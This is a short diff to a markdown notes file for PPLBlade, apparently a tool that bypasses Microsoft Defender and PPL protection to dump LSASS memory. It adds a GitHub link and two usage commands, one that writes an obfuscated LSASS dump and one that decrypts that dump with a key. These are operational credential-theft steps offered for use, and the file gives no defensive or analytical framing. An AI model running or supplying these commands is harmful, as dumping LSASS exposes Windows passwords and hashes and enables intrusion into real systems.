@@ -2,8 +2,10 @@
 
 ## Link: https://tacticaladversary.io/adversary-tactics/bypass-defender-and-ppl-protection-to-dump-lsass/?s=08
 
+## Github repo: https://github.com/tastypepperoni/PPLBlade
+
 ### Usage:
 
-#### PPLBlade.exe --mode dothatlsassthing --obfuscate
+#### 1) PPLBlade.exe --mode dothatlsassthing --obfuscate (Dump obfuscated dump file)
 
-### Dump file created successfully
+#### 2) PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade (Deobfuscate dump file)
